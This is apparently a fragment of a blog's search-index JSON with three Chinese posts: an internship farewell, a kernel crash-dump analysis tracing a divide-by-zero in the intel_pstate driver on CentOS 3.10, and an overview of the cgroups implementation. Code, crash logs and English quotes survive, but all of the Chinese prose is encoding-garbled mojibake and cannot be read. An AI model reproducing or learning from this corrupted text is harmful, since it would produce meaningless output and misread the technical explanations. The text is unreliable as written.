¡è¿‘ï¼Œä»¥åä¸å¤ªå¯èƒ½åœ¨å»åŒ—äº¬äº†ã€‚ä¸€æ—¥ä¸‰é¤å¥½åƒéƒ½å’Œå…¬å¸æœ‰å…³ï¼Œæ—©é¤æ˜¯é¥¿äº†ä¹ˆæ—©é¤ï¼Œå¯ä»¥è¯´æ˜¯ç‰©ç¾ä»·å»‰; åˆé¤ team ä¸€èµ·ï¼Œå¤©å¤©é€›å•†åŸåƒ; æ™šé¤é€‰æ‹©åŠ ç­é¤ï¼Œç®¡é¥±ä¸è¦é’±ã€‚ ç¦»èŒæ—¶é—´çœŸå¿«ï¼Œä¸¤ä¸ªæœˆï¼Œå¼€å­¦äº†ã€‚è¾¹ä¸Šçš„å·¨å·¨ç¦»èŒè¯»ç ”äº†ï¼Œå·¨å·¨è¾¹ä¸Šçš„å·¨å·¨çš„è¾¹ä¸Šå·¨å·¨è¯·å‡å›å­¦æ ¡äº†ï¼Œç»„é‡Œé¢ç©ºè¡è¡çš„ã€‚æˆ‘ä¹Ÿè¦ç¦»èŒå›å­¦æ ¡äº†ï¼Œæœ‰ç‚¹ä¸æƒ³èµ°ï¼Œå› ä¸ºå­¦æ ¡çš„ç®¡ç†åˆä¸å¾—ä¸èµ°ï¼Œå¸Œæœ›å­¦æ ¡å‡ºç°ç‚¹å˜åŒ–ã€‚ä¸´èµ°å¸¦èµ°äº†è€å¤§å¯¹æˆ‘çš„å®ä¹ è¯„è¯­ï¼š intern_commit ä¸è¶³ çŸ¥è¯†å‚¨å¤‡ï¼š çœŸåˆ‡çš„æ„Ÿå—çŸ¥è¯†å‚¨å¤‡çš„ä¸è¶³ï¼Œåœ¨ç¹é•¿çš„ log é¢å‰æœ‰æ—¶å€™ä¸èƒ½å®šä½åˆ°ä¸»è¦é—®é¢˜çš„ä¸»è¦æ–¹é¢ï¼Œæµªè´¹å¤§é‡æ—¶é—´; å¯¹ linux å·¥ä½œä¸­ç”¨çš„å­ç³»ç»Ÿç†è§£ä¸å¤Ÿæ·±å…¥ï¼Œå¦‚æœç†è§£æ·±å…¥å¯ä»¥æŠŠéƒ¨åˆ†éœ€æ±‚åšçš„æ›´ç»†è‡´ã€‚ è¯­è¨€å±‚é¢ï¼š æˆ‘ä¹‹å‰æŠ±ç€è¯­è¨€ä¸é‡è¦çš„å¿ƒæ€ï¼Œç°åœ¨è®¤è¯†åˆ°æŠ€ä»¥è½½é“ï¼Œç»„å†…ç”¨ golang, æˆ‘éœ€è¦ç†Ÿç»ƒä½¿ç”¨ golang æ¥è¡¨è¿°æˆ‘å¯¹æŠ€æœ¯çš„ç†è§£ã€‚ å½“ç„¶è¿˜æœ‰å…¶ä»–ä¸è¿‡æˆ‘è®¤ä¸ºå…¶ä½™çš„ä¸å¦‚ä¸Šé¢ä¸¤ä¸ªé‡è¦ã€‚","tags":["life"]},{"title":"analysis of kernel crash","path":"/2016/08/04/kernel-panic/","content":"åŸºäºå›å¿†æ•´ç† 0x00 beginningæ˜¨å¤©æ—©ä¸Šæˆ‘è¿˜åœ¨åƒæ—©é¤ï¼Œè€å¤§å¯¹æˆ‘è®²æˆ‘ä»¬çš„æœåŠ¡å™¨æŒ‚äº†ï¼Œkernel åœ¨ä¸´æ­»å‰ç•™ä¸‹äº†ä¸€ä¸ª dump. 0x10 autopsyç„¶åï¼Œå°¸æ£€çš„æ´»è®©æˆ‘æ¥ï¼ 0x11 kernel versionç¡®è®¤ä¸€ä¸‹å°¸ä½“ä¿¡æ¯ï¼Œä»¥åŠæ­»å› ã€‚ 123456789101112 KERNEL: /usr/lib/debug/lib/modules/3.10.0-229.el7.x86_64/vmlinux DUMPFILE: vmcore [PARTIAL DUMP] CPUS: 24 DATE: Wed Aug 3 10:10:42 2016 UPTIME: 95 days, 17:54:10LOAD AVERAGE: 0.13, 0.13, 0.14 TASKS: 544 RELEASE: 3.10.0-229.el7.x86_64 VERSION: #1 SMP Fri Mar 6 11:36:42 UTC 2015 MACHINE: x86_64 (2394 Mhz) MEMORY: 95.6 GB PANIC: &quot;divide error: 0000 [#1] SMP &quot; kernel æ˜¯ centos çš„3.10.0-229, é™¤ 0 å¯¼è‡´äº†æ­»äº¡ã€‚ 0x12 logçŸ¥é“äº†æ­»äºé™¤ 0, åˆ©ç”¨ log çœ‹ä¸€ä¸‹å‡¶æ‰‹è°ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738PID: 0 TASK: ffff88183d27e660 CPU: 19 COMMAND: &quot;swapper/19&quot; #0 [ffff88187fce3a90] machine_kexec at ffffffff8104c681 #1 [ffff88187fce3ae8] crash_kexec at ffffffff810e2222 #2 [ffff88187fce3bb8] oops_end at ffffffff8160d188 #3 [ffff88187fce3be0] die at ffffffff810173eb #4 [ffff88187fce3c10] do_trap at ffffffff8160c860 #5 [ffff88187fce3c60] do_divide_error at ffffffff81013f7e #6 [ffff88187fce3d10] divide_error at ffffffff816160ce [exception RIP: intel_pstate_timer_func+376] RIP: ffffffff814a9d28 RSP: ffff88187fce3dc8 RFLAGS: 00010206 RAX: 0000000027100000 RBX: ffff880c3b059e00 RCX: 0000000000000000 RDX: 0000000000000000 RSI: 0000000000000010 RDI: 000000002e5361f0 RBP: ffff88187fce3e28 R8: ffff88183ca08038 R9: ffff88183ca08001 R10: 0000000000000002 R11: 0000000000000005 R12: 000000000000513f R13: 0000000000271000 R14: 000000000000513f R15: ffff880c3b059e00 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018 #7 [ffff88187fce3e30] call_timer_fn at ffffffff8107e046 #8 [ffff88187fce3e68] run_timer_softirq at ffffffff8107fecf #9 [ffff88187fce3ee0] __do_softirq at ffffffff81077bf7#10 [ffff88187fce3f50] call_softirq at ffffffff8161635c#11 [ffff88187fce3f68] do_softirq at ffffffff81015de5#12 [ffff88187fce3f80] irq_exit at ffffffff81077f95#13 [ffff88187fce3f98] smp_apic_timer_interrupt at ffffffff81616fd5#14 [ffff88187fce3fb0] apic_timer_interrupt at ffffffff8161569d--- &lt;IRQ stack&gt; ---#15 [ffff880c3db4bde8] apic_timer_interrupt at ffffffff8161569d [exception RIP: native_safe_halt+6] RIP: ffffffff81052dd6 RSP: ffff880c3db4be90 RFLAGS: 00000286 RAX: 00000000ffffffed RBX: ffffffff8109b938 RCX: 0100000000000000 RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000046 RBP: ffff880c3db4be90 R8: 0000000000000000 R9: 0000000000000000 R10: 0000000000000004 R11: 0000000000000005 R12: 0000000085099e00 R13: 0000000000000013 R14: 00000002ed0ef7c8 R15: 001d63c002b695c0 ORIG_RAX: ffffffffffffff10 CS: 0010 SS: 0018#16 [ffff880c3db4be98] default_idle at ffffffff8101c93f#17 [ffff880c3db4beb8] arch_cpu_idle at ffffffff8101d236#18 [ffff880c3db4bec8] cpu_startup_entry at ffffffff810c6955#19 [ffff880c3db4bf28] start_secondary at ffffffff810423ca å¯ä»¥çœ‹è§intel_pstate_timer_funcå‡½æ•°ç›´æ¥å¯¼è‡´äº†æ­»äº¡ï¼Œåé¢å¼€å§‹äº†kdumpæ”¶å°¸ã€‚ 0x13 backtraceæ—¢ç„¶èƒ½å¤§ä½“ç¡®è®¤å‡¶æ‰‹äº†ï¼Œä¸‹é¢å°è¯•çœ‹ä¸€ä¸‹çŠ¯ç½ªç°åœºï¼Œåˆ©ç”¨btçš„ripå€¼ffffffff814a9d28æ‰¾ä¸€ä¸‹ä»£ç ã€‚ 12345678910111213/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 470xffffffff814a9d15 &lt;intel_pstate_timer_func+357&gt;:\tmovslq %r12d,%r14/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 520xffffffff814a9d18 &lt;intel_pstate_timer_func+360&gt;:\tmovslq %r13d,%rax/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 6050xffffffff814a9d1b &lt;intel_pstate_timer_func+363&gt;:\tshl $0x8,%rdx/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 520xffffffff814a9d1f &lt;intel_pstate_timer_func+367&gt;:\tshl $0x8,%rax/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/include/linux/math64.h: 290xffffffff814a9d23 &lt;intel_pstate_timer_func+371&gt;:\tmovslq %edx,%rcx/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/include/linux/math64.h: 300xffffffff814a9d26 &lt;intel_pstate_timer_func+374&gt;:\tcqto 0xffffffff814a9d28 &lt;intel_pstate_timer_func+376&gt;:\tidiv %rcx ç»“åˆ backtrace å‘ç°rcxæ˜¯ 0 ä¸”0xffffffff814a9d28å¤„æŒ‡ä»¤idiv %rcx,kernel å‘ç”Ÿäº†é™¤ 0 å¼‚å¸¸ã€‚ä¸”è¿˜å¯ä»¥åˆæ­¥æ–­å®šé—®é¢˜æ˜¯ï¼šdrivers/cpufreq/intel_pstate.cä¸­çš„å‡½æ•°è°ƒç”¨äº†include/linux/math64.h30 è¡Œçš„æŒ‡ä»¤ã€‚ 0x14 causeåˆ°åº•æ­»äº¡èƒŒåçš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿ3.10.0-229.el7å¯¹åº”ç€æºç åŒ…æ˜¯3.10.0-229.el7.src.rpm, å¹¶ä¸èƒ½å¯¹åº”ç€upstreamä»£ç ç›´æ¥çœ‹ï¼Œå› ä¸ºå¹¶ä¸æ¸…æ¥š 3.10 çš„å“ªä¸ªå°ç‰ˆæœ¬ã€‚å…¶ä¸­å¯¹åº”ç€intel_pstate_timer_func()çš„å®ç°ï¼Œä¸”è¿˜åˆ©ç”¨çš„ log çš„å †æ ˆæ‰¾å‡ºæ¥ inline å‡½æ•°çš„è°ƒç”¨æ¬¡åºã€‚ 12345678910static void intel_pstate_timer_func(unsigned long __data)&#123;\tstruct cpudata *cpu = (struct cpudata *) __data;\tstruct sample *sample;\tintel_pstate_sample(cpu);\tsample = &amp;cpu-&gt;sample;\tintel_pstate_adjust_busy_pstate(cpu); // è¿™é‡Œï¼çœ‹å‡½æ•°åçŒœæµ‹æ˜¯åˆ¤æ–­ busy çŠ¶æ€ ...&#125; 12345678910static inline void intel_pstate_adjust_busy_pstate(struct cpudata *cpu)&#123;\tint32_t busy_scaled;\tstruct _pid *pid;\tsigned int ctl;\tpid = &amp;cpu-&gt;pid;\tbusy_scaled = intel_pstate_get_scaled_busy(cpu); // è·å–ç›¸å…³çŠ¶æ€ ...&#125; 12345678910111213141516static inline int32_t intel_pstate_get_scaled_busy(struct cpudata *cpu)&#123;\tint32_t core_busy, max_pstate, current_pstate, sample_ratio;\tu32 duration_us;\tu32 sample_time; ...\tduration_us = (u32) ktime_us_delta(cpu-&gt;sample.time, cpu-&gt;last_sample_time);\tif (duration_us &gt; sample_time * 3) &#123; sample_ratio = div_fp(int_tofp(sample_time), // æ­»å‰ä¸€åˆ€ï¼Œint_tofp å§‹ duration_us æ˜¯ 0. int_tofp(duration_us)); core_busy = mul_fp(core_busy, sample_ratio);\t&#125;\treturn core_busy;&#125; è¿™ä¸ªæ—¶å€™æŸ¥çœ‹ struct cpudata ç»“æ„ä½“çš„å€¼ï¼ˆè¿™ä¸ªæ˜¯æ¯ cpu å˜é‡å¯ä»¥ p cpu_info:17ï¼‰: 1234567891011121314151617181920212223242526272829303132struct cpudata &#123; cpu = 113, timer = &#123; entry = &#123; next = 0x0, prev = 0xdead000000200200 &#125;, expires = 8357799745, base = 0xffff883fe84ec001, function = 0xffffffff814a9100 &lt;intel_pstate_timer_func&gt;, data = 18446612406765768960,&lt;snip&gt; i_gain = 0, d_gain = 0, deadband = 0, last_err = 22489 &#125;, last_sample_time = &#123; tv64 = 4063132438017305 &#125;, prev_aperf = 287326796397463, prev_mperf = 251427432090198, sample = &#123; core_pct_busy = 23081, aperf = 2937407, mperf = 3257884, freq = 2524484, time = &#123; tv64 = 4063149215234118 &#125; &#125;&#125; ç»“åˆduration_us = (u32) ktime_us_delta(cpu-&gt;sample.time, cpu-&gt;last_sample_time)ä¸ä¸Šä¸‹æ–‡ï¼Œè®¡ç®—é‡‡æ ·é—´éš”æ˜¯ 131901387587754ns, è¿›è¡Œ (u32) ç±»å‹è½¬æ¢ä¹Ÿæº¢å‡ºã€‚åé¢int_tofpå®ç°ä¸º#define int_tofp(X) ((int64_t)(X) &lt;&lt; 8), æ‰€ä»¥int_tofp(duration_us))è°ƒç”¨å¯¼è‡´å…¶å˜æˆduration_uså˜æˆ 0. åˆå› ä¸ºdiv_fpçš„è°ƒç”¨ï¼Œæ‰€ä»¥ crash å‡ºç°äº†ã€‚ 12345static inline int32_t div_fp(int32_t x, int32_t y)&#123;\treturn div_s64((int64_t)x &lt;&lt; FRAC_BITS, y);&#125; å‡ºäºå®Œæ•´æ€§è€ƒè™‘ï¼Œè¿™é‡Œè´´å‡ºäº† inline å‡½æ•°çš„è°ƒç”¨æ¬¡åº (åŸºäºæºç é˜…è¯»å’Œ backtrace å‡‘å‡ºæ¥çš„): 12345678910/** * div_s64 - signed 64bit divide with 32bit divisor */#ifndef div_s64static inline s64 div_s64(s64 dividend, s32 divisor)&#123;\ts32 remainder;\treturn div_s64_rem(dividend, divisor, &amp;remainder); // æ…å‡ºäº†é‚£ä¸€åˆ€&#125;#endif åˆ°è¿™é‡ŒåŸºæœ¬å°±å’Œ log æ˜¾ç¤ºè°ƒç”¨æ ˆä¸€è‡´äº†ï¼Œä»£ç åœ¨ math.h çš„ 30 è¡Œã€‚ 123456789/** * div_s64_rem - signed 64bit divide with 32bit divisor with remainder */static inline s64 div_s64_rem(s64 dividend, s32 divisor, s32 *remainder)&#123;\t*remainder = dividend % divisor;\treturn dividend / divisor; // 30 è¡Œï¼Œæ­»äº¡ï¼&#125; google ä¸€ä¸‹ï¼Œçœ‹è§äº†æ›¾ç»æœ‰äººé‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼š The kernel may delay interrupts for a long time which can result in timers being delayed. If this occurs the intel_pstate driver will crash with a divide by zero error 0x20 background and solution0x21 backgroundè¿™ä¸ªé©±åŠ¨æ˜¯ intel ä¸ºâ€SandyBridge+â€å¾®æ¶æ„ CPU æä¾›çš„è°ƒæ•´é¢‘ç‡çš„æ§åˆ¶æ¥å£ [^pstate]. 0x22 solutioné€šè¿‡ Google æ‰¾åˆ°è¿™ä¸ª bug å·²ç»å­˜åœ¨ [^patch] çš„ï¼Œæ‰€ä»¥ç›®å‰æœ€å¥½æ–¹æ¡ˆæ˜¯å‡çº§å†…æ ¸ï¼Œcentos å‡çº§åˆ° 3.10.0-229.20.1.el7. çº¿ä¸Šä¸»æœºå¾ˆå¤šï¼Œæä¾›ä¸€ä¸ªä¸´æ—¶çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šç¦ç”¨ pstate[^wiki]. pstate çš„æ–°çš„åŠŸç‡é©±åŠ¨ç¨‹åºå°†ä¼šåœ¨ä»¥ä¸‹çš„é©±åŠ¨ç¨‹åºä¹‹å‰è‡ªåŠ¨ä¸ºç°ä»£çš„ Intel CPU å¯ç”¨ã€‚è¯¥é©±åŠ¨ä¼šä¼˜å…ˆäºå…¶ä»–çš„é©±åŠ¨ç¨‹åºï¼Œå› ä¸ºå®ƒæ˜¯å†…ç½®é©±åŠ¨ï¼Œè€Œä¸æ˜¯ä½œä¸ºä¸€ä¸ªæ¨¡å—æ¥åŠ è½½ã€‚è¯¥é©±åŠ¨è‡ªåŠ¨ä½œç”¨äº Sandy Bridge å’Œ Ivy Bridge è¿™ä¸¤ä¸ªç±»å‹çš„ CPUã€‚å¦‚æœæ‚¨åœ¨ä½¿ç”¨è¿™ä¸ªé©±åŠ¨çš„æ—¶å€™é‡åˆ°é—®é¢˜ï¼Œå»ºè®®æ‚¨åœ¨ Grub çš„å†…æ ¸å‚æ•°ä¸­å¯¹å…¶ç¦ç”¨ï¼ˆå³ä¿®æ”¹ /etc/default/grub æ–‡ä»¶ï¼Œåœ¨GRUB_CMDLINE_LINUX_DEFAULT= åæ·»åŠ intel_pstate=disableï¼‰ã€‚ 0x23 The question of temporary solutionæ–¹æ¡ˆæå‡ºäº†è¿˜æ²¡æœ‰éªŒè¯ï¼Œè€å¤§å¸®æˆ‘éªŒè¯äº†ã€‚ å…³é—­äº† P-State åï¼Œå†…æ ¸å±‚é¢å¤±å»äº†æ§åˆ¶ç¡¬ä»¶ CPU é¢‘ç‡çš„æ¥å£ï¼Œä¸å†å¯¹ CPU çš„é¢‘ç‡è¿›è¡Œæ§åˆ¶ã€‚æ ¹æ®ä¸‹å›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æˆ‘ä»¬ç¦ç”¨è¿™ä¸ªæ¨¡å—å‰ï¼ŒCPU çš„é¢‘ç‡å— P-State çš„æ§åˆ¶ï¼ŒåŒæ—¶ turbo è¢«æ‰“å¼€ï¼Œä¸€ç›´å¤„äºä¸€ä¸ª 2.6GHz çš„æ°´å¹³ã€‚ç¦ç”¨å CPU é¢‘ç‡ä¸å†å— P-State æ§åˆ¶ï¼Œä¹‹å‰ä½¿ç”¨ P-State æ‰“å¼€çš„ turbo ä¹Ÿåœæ­¢å·¥ä½œï¼Œæœ€ç»ˆé¢‘ç‡ç¨³å®šçš„å·¥ä½œåœ¨ CPU çš„é»˜è®¤é…ç½® 2.4GHzã€‚ è¿˜æœ‰ä¸€äº›é—®é¢˜æœ‰å¾…ä»¥åéªŒè¯ã€‚1: apic_timer_interruptæŠ›å‡ºå»çš„å¼‚å¸¸ã€‚2: ä¸å®Œæ•´çš„ patch çŒœæƒ³ï¼Œå‡†å¤‡å’Œä½œè€…æ²Ÿé€šä¸€ä¸‹æè¿°è¿™ä¸ªé—®é¢˜ã€‚ å…³äºé—®é¢˜ 2, ä½œè€…å·²ç»ç»™å‡ºäº†è¡¨è¿°ã€‚ and found last_sample_time &#x3D; { tv64 &#x3D; -131888820469800 }. This doesnâ€™t make sense. last_sample_time is a u64 field, so it canâ€™t be negative. [^patch]: [PATCH] cpufreq, Fix overflow in busy_scaled due to long delay[^wiki]: archlinux wiki[^pstate]: intel-pstate","tags":["linux"]},{"title":"cgroups II - cgroup implementation overview","path":"/2016/07/29/cgroup-ii-implementation-overview/","content":"0x00 cgroups implementationå› ä¸ºcgroupså…¶ä»–å­ç³»ç»Ÿçš„åº”ç”¨è¿œæ¯”net_clsè¦ç®€å•çš„å¤šï¼Œæ‰€ä»¥åé¢ä¸æ˜¯ä»‹ç»å…¶ä»–å­ç³»ç»Ÿä½¿ç”¨ï¼Œè€Œæ˜¯åˆ†æä¸€ä¸‹cgroupsçš„å®ç° (base kernel 3.10).åœ¨æ­£å¼åˆ‡å…¥å®ç°ä¹‹å‰å›é¡¾ä¸€ä¸‹ï¼Œcgroupså­ç³»ç»Ÿçš„ä»‹ç» [^lwn]. blkio â€” è¿™ä¸ªå­ç³»ç»Ÿä¸ºå—è®¾å¤‡è®¾å®šè¾“å…¥ &#x2F; è¾“å‡ºé™åˆ¶ï¼Œæ¯”å¦‚ç‰©ç†è®¾å¤‡ï¼ˆç£ç›˜ï¼Œå›ºæ€ç¡¬ç›˜ï¼ŒUSB ç­‰ç­‰ï¼‰ã€‚ cpu â€” è¿™ä¸ªå­ç³»ç»Ÿä½¿ç”¨è°ƒåº¦ç¨‹åºæä¾›å¯¹ CPU çš„ cgroup ä»»åŠ¡è®¿é—®ã€‚ cpuacct â€” è¿™ä¸ªå­ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆ cgroup ä¸­ä»»åŠ¡æ‰€ä½¿ç”¨çš„ CPU æŠ¥å‘Šã€‚ cpuset â€” è¿™ä¸ªå­ç³»ç»Ÿä¸º cgroup ä¸­çš„ä»»åŠ¡åˆ†é…ç‹¬ç«‹ CPUï¼ˆåœ¨å¤šæ ¸ç³»ç»Ÿï¼‰å’Œå†…å­˜èŠ‚ç‚¹ã€‚ devices â€” è¿™ä¸ªå­ç³»ç»Ÿå¯å…è®¸æˆ–è€…æ‹’ç» cgroup ä¸­çš„ä»»åŠ¡è®¿é—®è®¾å¤‡ã€‚ freezer â€” è¿™ä¸ªå­ç³»ç»ŸæŒ‚èµ·æˆ–è€…æ¢å¤ cgroup ä¸­çš„ä»»åŠ¡ã€‚ memory â€” è¿™ä¸ªå­ç³»ç»Ÿè®¾å®š cgroup ä¸­ä»»åŠ¡ä½¿ç”¨çš„å†…å­˜é™åˆ¶ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆå†…å­˜èµ„æºä½¿ç”¨æŠ¥å‘Šã€‚â€¦ çœç•¥æ‰ä¸€éƒ¨åˆ†ä¸æ˜¯ç‰¹åˆ«å…³æ³¨çš„å­ç³»ç»Ÿ (å› ä¸ºç›¸å¯¹åº”ç”¨åœºæ™¯å°ï¼ŒèƒŒæ™¯çŸ¥è¯†å¤š!).è¿™ä¸ª post è¡Œæ–‡é€»è¾‘å‚è€ƒäº† [^wangjiefeng], å„ä¸ªå­ç³»ç»Ÿçš„å®ç°ä½ç½®å¯ä»¥å‚è€ƒ [^netlec]. 0x10 init cgroupscgroupæ˜¯ä¸€ä¸ªæ ‘çŠ¶ç»“æ„åˆ†å¸ƒï¼Œç³»ç»Ÿåœ¨å¯åŠ¨æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªcgroupç³»ç»Ÿï¼Œåœ¨start_kernelè°ƒç”¨cgroup_init(), è¿™ä¸ªå‡½æ•°å®ç°åœ¨kernel/cgroup.cä¸­ã€‚ 1234567891011121314151617181920int __init cgroup_init(void)&#123; ... bdi_init(&amp;cgroup_backing_dev_info); ...\tfor (i = 0; i &lt; CGROUP_SUBSYS_COUNT; i++) &#123; ... cgroup_init_subsys(ss); ... cgroup_init_idr(ss, init_css_set.subsys[ss-&gt;subsys_id]);\t&#125;\tkey = css_set_hash(init_css_set.subsys);\thash_add(css_set_table, &amp;init_css_set.hlist, key);\tkobject_create_and_add(&quot;cgroup&quot;, fs_kobj); register_filesystem(&amp;cgroup_fs_type);\tproc_create(&quot;cgroups&quot;, 0, NULL, &amp;proc_cgroupstats_operations); ...&#125; bdi_initå‚æ•°æ˜¯ kernel ç”¨æ¥æ§åˆ¶å›å†™çš„ç»“æ„ä½“backing_dev_info, å…¶ä¸­æœ‰æ§åˆ¶æœ‰æ§åˆ¶ I&#x2F;O å¸¦å®½å’Œè¢«è°ä½¿ç”¨ç­‰é‡è¦å‚æ•°ã€‚å…¶ä¸»è¦å·¥ä½œæ˜¯åœ¨åˆ©ç”¨for (i &lt; CGROUP_SUBSYS_COUNT)åé¢è¯­å¥å—ä¸ºäº†æ¯ä¸€ä¸ªå­ç³»ç»Ÿè°ƒç”¨cgroup_init_subsys()æ¥åˆå§‹åŒ–å­ç³»ç»Ÿï¼Œè°ƒç”¨cgroup_init_idr()[^idr] æ¥åˆ›å»ºInteger ID Management, ååˆ©ç”¨css_set_hashä¸hash_addåˆ›å»ºä¸€ä¸ª hash è¡¨ï¼Œä»¥æ­¤æé«˜ç³»ç»Ÿå¯¹ä¸€ä¸ªå·²ç»å­˜åœ¨çš„css_setçš„æŸ¥æ‰¾æ—¶æ€§èƒ½ï¼Œåˆåˆ©ç”¨kobject_create_and_add(&quot;cgroup&quot;, fs_kobj)åˆ›å»ºä¸€ä¸ªkobjectå¯¹è±¡ï¼Œåˆ©ç”¨register_filesystem(&amp;cgroup_fs_type)æ³¨å†Œäº†cgroupæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨proc_create(&quot;cgroups&quot;, 0, NULL, &amp;proc_cgroupstats_operations)åœ¨procä¸‹åˆ›å»ºäº†cgroupå¼€å…³ [^source]. 0x20 mainly data structureså› ä¸ºæ¯ä¸€ä¸ªhierarchyä¸­éƒ½æœ‰ä¸€ä¸ªtaskæ–‡ä»¶ï¼Œé‡Œé¢æ”¾ç½®ç€ PID, å¯ä»¥çŒœæµ‹è¿›ç¨‹æ˜¯cgroupä¸­é‡è¦çš„çº½å¸¦ï¼Œæ‰€ä»¥ä»task_structç»“æ„æ¥åˆ‡å…¥cgroupæœ‰å…³çš„ä¸»è¦ä»£ç ã€‚ 123456#ifdef CONFIG_CGROUPS/* Control Group info protected by css_set_lock */ struct css_set __rcu *cgroups;/* cg_list protected by css_set_lock and tsk-&gt;alloc_lock */ struct list_head cg_list;#endif å¯ä»¥çœ‹è§cgroupsæ˜¯ä¸ªcss_set(cgroups subsystem status) æŒ‡é’ˆï¼Œè€Œcss_setå­˜å‚¨äº†ä¸è¿›ç¨‹ç›¸å…³çš„cgroupsä¿¡æ¯ï¼Œcg_listæ˜¯ä¸€ä¸ªé“¾è¡¨å¤´æŒ‡é’ˆï¼ŒåŒ…å«æ‰€æœ‰é“¾æ¥åˆ°åŒä¸€ä¸ªcss_setçš„ task. css_setçš„ç»“æ„å¦‚ä¸‹ï¼š 1234567891011121314151617181920struct css_set &#123;\t/* å½“å‰ css_set å¼•ç”¨è®¡æ•°å™¨ï¼Œå› ä¸º css_set å¯ä»¥å¤šä¸ªè¿›ç¨‹å…±ç”¨ï¼Œåªè¦è¿™äº›è¿›ç¨‹çš„ cgroups ä¿¡æ¯ç›¸åŒã€‚*/\tatomic_t refcount;\t/* hlist æ˜¯ hash è¡¨ä¸­çš„èŠ‚ç‚¹ï¼Œç”¨äºæŠŠæ‰€æœ‰ css_set ç»„ç»‡æˆä¸€ä¸ª hash è¡¨ï¼Œæ–¹ä¾¿å†…æ ¸å¿«é€ŸæŸ¥æ‰¾ç‰¹å®šçš„ css_set. */\tstruct hlist_node hlist;\t/* task æŒ‡å‘æ‰€æœ‰è¿æ¥åˆ°æ­¤ css_set çš„è¿›ç¨‹ç»„æˆçš„é“¾è¡¨ã€‚*/\tstruct list_head tasks;\t/* cg_links å˜é‡è‡ªå½“å‰çš„ css_set æŒ‡å‘ cg_group_link ç»„æˆçš„é“¾è¡¨ã€‚*/\tstruct list_head cg_links;\t/* å­ç³»ç»Ÿçš„çŠ¶æ€é›†åˆï¼Œå®ƒç”± init_css_set çš„åœ¨ç³»ç»Ÿå¯åŠ¨å’Œå­ç³»ç»Ÿæ¨¡å—è½½å…¥å’Œå¸è½½æ—¶åˆ›å»ºï¼Œä¸”ä¹‹åä¸èƒ½æ”¹å˜ã€‚*/\tstruct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];\t/* åˆ©ç”¨ rcu ä¿è¯åˆ é™¤ä¸€è‡´æ€§ */\tstruct rcu_head rcu_head;&#125;; css_set-&gt;subsysæ˜¯cgroup_subsys_stateæŒ‡é’ˆæ•°ç»„ï¼Œå®ƒè®°å½•è¿›ç¨‹ä¸ç‰¹å®šå­ç³»ç»Ÿç›¸å…³çš„ä¿¡æ¯ï¼Œé€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œè¿›ç¨‹å¯ä»¥è·å¾—ç›¸åº”çš„ cgroup çš„æ§åˆ¶ä¿¡æ¯ã€‚ cgroup_subsys_stateç»“æ„å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223/* ç”±ç³»ç»Ÿç»´æŠ¤çš„æ¯è¿›ç¨‹ / æ¯ cgroup çš„çŠ¶æ€ */struct cgroup_subsys_state &#123;\t/* * The cgroup that this subsystem is attached to. Useful * for subsystems that want to know about the cgroup * hierarchy structure */\tstruct cgroup *cgroup;\t/* * State maintained by the cgroup system to allow subsystems * to be &quot;busy&quot;. Should be accessed via css_get(), * css_tryget() and css_put(). */\tatomic_t refcnt;\tunsigned long flags;\t/* ID for this css, if possible */\tstruct css_id __rcu *id;\t/* Used to put @cgroup-&gt;dentry on the last css_put() */\tstruct work_struct dput_work;&#125; cgroup_subsys_stateé‡Œé¢æœ€é‡è¦çš„å°±æ˜¯*cgroupå­—æ®µï¼Œcgroup æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ª cgroup ç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¿›ç¨‹æ‰€å±çš„ cgroup. è¿›ç¨‹æ”¶åˆ°ç‰¹å®šå­ç³»ç»Ÿçš„æ§åˆ¶å°±æ˜¯åŠ å…¥ç‰¹å®šçš„ cgroup å®ç°çš„ã€‚å› ä¸º cgroup åœ¨ç‰¹å®š hierarchy ä¸Šé¢ï¼Œè€Œå­ç³»ç»Ÿæœ‰äº‹é™„åŠ åˆ°å±‚çº§ä¸Šçš„ï¼Œè¿™æ ·ç»“æ„å°±å®Œæ•´äº†æ¢³ç†å‡ºæ¥äº†task_struct-&gt;css_set-&gt;cgroup_state-&gt;cgroup.è™½ç„¶æ³¨é‡Šå†™çš„æ˜¯â€ç”±ç³»ç»Ÿç»´æŠ¤çš„æ¯è¿›ç¨‹ &#x2F; æ¯ cgroup çš„çŠ¶æ€â€, ä½†æ˜¯åœ¨ç»“æ„ä½“é‡Œé¢å¹¶æ²¡æœ‰çœ‹è§æ§åˆ¶ä¿¡æ¯ï¼ŒçŸ¥è¯†å®šä¹‰äº†å„ä¸ªå­ç³»ç»Ÿéƒ½éœ€è¦çš„å…±åŒä¿¡æ¯ï¼Œæ¯”å¦‚è¯¥ cgroup_subsys_state ä»å±çš„ cgroup. å…¶å®å„å­ç³»ç»Ÿåœ¨æ ¹æ®å„è‡ªçš„å®é™…éœ€æ±‚å®ç°è‡ªå·±çš„æ§åˆ¶ä¿¡æ¯ï¼Œæœ€ååœ¨å„è‡ªçš„ç»“æ„ä½“ä¸­å°†cgroup_subsys_stateåŒ…å«è¿›å»ã€‚è¿™æ · kernel 